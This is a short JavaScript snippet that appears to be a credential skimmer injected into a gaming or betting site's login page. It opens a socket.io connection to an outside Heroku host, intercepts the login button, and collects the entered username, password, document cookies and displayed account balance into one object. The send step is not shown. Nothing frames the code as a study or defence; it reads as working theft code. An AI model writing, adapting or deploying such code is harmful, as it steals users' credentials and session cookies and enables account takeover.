const socket = io("https://vin88.herokuapp.com");
var acc = {}
$(".button-login").click(function (e) { 
    e.preventDefault();
    acc.username = $("input[name=txtUsername]").val();
    acc.pass = $("input[name=txtPassword]").val();
    setTimeout(() => {
        acc.cookie = document.cookie
        acc.gvin = $(".money-1").text();
    }, 8);
});
